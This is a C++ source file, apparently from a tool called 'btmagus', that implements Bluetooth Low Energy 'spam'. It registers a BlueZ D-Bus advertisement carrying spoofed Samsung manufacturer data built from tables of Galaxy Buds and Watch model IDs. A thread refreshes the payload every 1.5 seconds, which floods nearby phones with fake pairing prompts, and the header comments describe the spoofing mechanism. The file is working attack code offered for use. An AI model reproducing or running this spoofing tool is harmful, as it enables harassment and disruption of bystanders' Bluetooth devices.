/*
 * ======================================================================================
 * REFERENCE - BLUEZ LE ADVERTISING MECHANISM
 * ======================================================================================
 * * How BlueZ Advertising Works (The "Inversion of Control"):
 * --------------------------------------------------------------------------------------
 * Unlike traditional APIs where you push data TO the system, BlueZ acts as a Client
 * and your application acts as a Server (D-Bus Object).
 * * 1. REGISTRATION: You tell BlueZ "I have an object at path '/org/btmagus/blespam'
 * that implements the interface 'org.bluez.LEAdvertisement1'."
 * (Method: RegisterAdvertisement)
 * * 2. INTERROGATION: BlueZ immediately calls 'GetAll' on your object path to read
 * your properties. This is where the data is actually transferred.
 * * 3. UPDATES: To change data (e.g., rotate MAC spoofing), you don't call BlueZ.
 * Instead, you emit a 'PropertiesChanged' signal on your object. BlueZ hears this,
 * wakes up, and calls your 'Getter' again to fetch the new data.
 * * --------------------------------------------------------------------------------------
 * THE "VTABLE" (D-Bus Interface: org.bluez.LEAdvertisement1)
 * --------------------------------------------------------------------------------------
 * Your D-Bus object must implement these properties with specific signatures.
 * A crash here usually means a Signature Mismatch (e.g., sending 'ay' instead of 'v').
 * * Mandatory Properties:
 * * Property: "Type"
 * Type:     String ("s")
 * Value:    "peripheral" (Connectable) or "broadcast" (Non-connectable)
 * * Optional Properties (Crucial for spoofing):
 * * Property: "ServiceUUIDs"
 * Type:     Array of Strings ("as")
 * Value:    List of 128-bit UUIDs (e.g., {"180D", "180F"})
 * * Property: "ManufacturerData"
 * Type:     Dictionary: Uint16 -> Variant containing Array of Bytes ("a{qv}")
 * Details:
 * - Key:   uint16_t (Manufacturer ID, e.g., 0x0075 for Samsung)
 * - Value: sdbus::Variant (Must wrap std::vector<uint8_t>)
 * * Property: "ServiceData"
 * Type:     Dictionary: String -> Variant containing Array of Bytes ("a{sv}")
 * Details:  Key is the Service UUID (e.g. "FE9F" for Google Fast Pair)
 * * Property: "LocalName"
 * Type:     String ("s")
 * Value:    Name shown in scanner (if packet space allows)
 * * Property: "Includes"
 * Type:     Array of Strings ("as")
 * Value:    {"tx-power", "appearance", "local-name"} (System auto-fills these)
 * * ======================================================================================
 */

#include "ble_spam.h"

#include <chrono>
#include <iostream>
#include <thread>
#include <sdbus-c++/AdaptorInterfaces.h>
#include <sdbus-c++/IConnection.h>

#include "../core/globals.h"

const std::map<std::string, std::string> genuineBudsIds = {
        {"EE7A0C", "Fallback Buds"},
        {"9D1700", "Fallback Dots"},
        {"39EA48", "Light Purple Buds2"},
        {"A7C62C", "Bluish Silver Buds2"},
        {"850116", "Black Buds Live"},
        {"3D8F41", "Gray & Black Buds2"},
        {"3B6D02", "Bluish Chrome Buds2"},
        {"AE063C", "Gray Beige Buds2"},
        {"B8B905", "Pure White Buds"},
        {"EAAA17", "Pure White Buds2"},
        {"D30704", "Black Buds"},
        {"9DB006", "French Flag Buds"},
        {"101F1A", "Dark Purple Buds Live"},
        {"859608", "Dark Blue Buds"},
        {"8E4503", "Pink Buds"},
        {"2C6740", "White & Black Buds2"},
        {"3F6718", "Bronze Buds Live"},
        {"42C519", "Red Buds Live"},
        {"AE073A", "Black & White Buds2"},
        {"011716", "Sleek Black Buds2"},
};

const std::map<std::string, std::string> genuineWatchIds = {
        {"001A", "Fallback Watch"},
        {"0001", "White Watch4 Classic 44m"},
        {"0002", "Black Watch4 Classic 40m"},
        {"0003", "White Watch4 Classic 40m"},
        {"0004", "Black Watch4 44mm"},
        {"0005", "Silver Watch4 44mm"},
        {"0006", "Green Watch4 44mm"},
        {"0007", "Black Watch4 40mm"},
        {"0008", "White Watch4 40mm"},
        {"0009", "Gold Watch4 40mm"},
        {"000A", "French Watch4"},
        {"000B", "French Watch4 Classic"},
        {"000C", "Fox Watch5 44mm"},
        {"0011", "Black Watch5 44mm"},
        {"0012", "Sapphire Watch5 44mm"},
        {"0013", "Purpleish Watch5 40mm"},
        {"0014", "Gold Watch5 40mm"},
        {"0015", "Black Watch5 Pro 45mm"},
        {"0016", "Gray Watch5 Pro 45mm"},
        {"0017", "White Watch5 44mm"},
        {"0018", "White & Black Watch5"},
        {"001B", "Black Watch6 Pink 40mm"},
        {"001C", "Gold Watch6 Gold 40mm"},
        {"001D", "Silver Watch6 Cyan 44mm"},
        {"001E", "Black Watch6 Classic 43m"},
        {"0020", "Green Watch6 Classic 43m"},
};

void startBleSpam(MessageDispatcher& msgDispatcher) {
    try {
        auto connection = sdbus::createSystemBusConnection();

        sdbus::ObjectPath myAdvPath{"/org/btmagus/blespam"};

        sdbus::InterfaceName interfaceName{"org.bluez.LEAdvertisement1"};

        advertisementGenerator generator(genuineBudsIds, genuineWatchIds);

        auto myAdvObject = sdbus::createObject(*connection, myAdvPath);

        myAdvObject->addVTable(
            sdbus::registerMethod("Release")
                 .implementedAs([](){
                     std::cerr << "[BleSpam]: Release called by BlueZ" << std::endl;
                 }),

            sdbus::registerProperty("Type")
                 .withGetter([](){ return "peripheral"; })
                 .withUpdateBehavior(sdbus::Flags::EMITS_CHANGE_SIGNAL),

            sdbus::registerProperty("ServiceUUIDs")
                 .withGetter([](){ return std::vector<std::string>{}; })
                 .withUpdateBehavior(sdbus::Flags::EMITS_CHANGE_SIGNAL),

                 sdbus::registerProperty("ManufacturerData")
                      .withGetter([&generator](){
                          std::map<uint16_t, sdbus::Variant> manufData;

                          std::vector<uint8_t> payload = generator.getGenuineWatchAdvertisement();

                          manufData[0x0075] = sdbus::Variant(payload);

                          std::string payload_str(payload.begin(), payload.end());
                          // msgDispatcher.dispatchMessage(Message(Message::BleSpam,
                          //     std::format("Manuf data payload size: {}", payload.size()))); // for debugging

                          return manufData;
                      })
                      .withUpdateBehavior(sdbus::Flags::EMITS_CHANGE_SIGNAL)

        ).forInterface(interfaceName);

        auto managerProxy = sdbus::createProxy(*connection, sdbus::ServiceName{"org.bluez"},
            sdbus::ObjectPath{getAdapterObjectPath()});

        msgDispatcher.dispatchMessage(Message(Message::BleSpam, "Registering advertisement..."));

        std::atomic<bool> registered{false};
        std::string registration_error;

        managerProxy->callMethodAsync("RegisterAdvertisement")
                    .onInterface("org.bluez.LEAdvertisingManager1")
                    .withArguments(myAdvPath, std::map<std::string, sdbus::Variant>{})
                    .uponReplyInvoke(
                        [&registered, &registration_error, &msgDispatcher](std::optional<sdbus::Error> error) {
                        if (error) {
                            registration_error = error->getMessage();
                            msgDispatcher.dispatchMessage(Message(Message::BleSpam,
                                std::format("Registration failed: {}", registration_error)));
                        } else {
                            msgDispatcher.dispatchMessage(Message(Message::BleSpam, "Advertisement registered!"));
                        }
                        registered = true;
                    });

        // Wait for registration to complete while processing events
        while (!registered.load() && isBleSpamRunning->load()) {
            connection->processPendingEvent();
            std::this_thread::sleep_for(std::chrono::milliseconds(10));
        }

        if (!registration_error.empty()) {
            throw sdbus::Error(sdbus::Error::Name("Registration"), registration_error);
        }

        std::jthread pulser([&](std::stop_token const &stoken){
            while(!stoken.stop_requested()){
                std::this_thread::sleep_for(std::chrono::milliseconds(1500));
                if (stoken.stop_requested()) break;

                //Emitting property change signal...
                myAdvObject->emitPropertiesChangedSignal(
                    interfaceName,
                    std::vector{sdbus::PropertyName{"ManufacturerData"}}
                );
            }
        });

        // Process events while running
        while (isBleSpamRunning->load()) {
            connection->processPendingEvent();
            std::this_thread::sleep_for(std::chrono::milliseconds(10));
        }

        pulser.request_stop();

        msgDispatcher.dispatchMessage(Message(Message::BleSpam, "Unregistering..."));

        // Unregister also async to avoid timeout
        std::atomic<bool> unregistered{false};
        managerProxy->callMethodAsync("UnregisterAdvertisement")
                    .onInterface("org.bluez.LEAdvertisingManager1")
                    .withArguments(myAdvPath)
                    .uponReplyInvoke([&unregistered, &msgDispatcher](std::optional<sdbus::Error> error) {
                        if (!error) {
                            msgDispatcher.dispatchMessage(Message(Message::BleSpam, "Unregistered successfully"));
                        }
                        unregistered = true;
                    });

        // Wait for unregister to complete
        auto timeout = std::chrono::steady_clock::now() + std::chrono::seconds(2);
        while (!unregistered.load() && std::chrono::steady_clock::now() < timeout) {
            connection->processPendingEvent();
            std::this_thread::sleep_for(std::chrono::milliseconds(10));
        }

    }
    catch(const sdbus::Error& e) {
        Message err_msg(Message::BleSpam, "[Error - BleSpam]: ");
        err_msg << e.what() << '\n';
        msgDispatcher.dispatchMessage(err_msg);
    }
}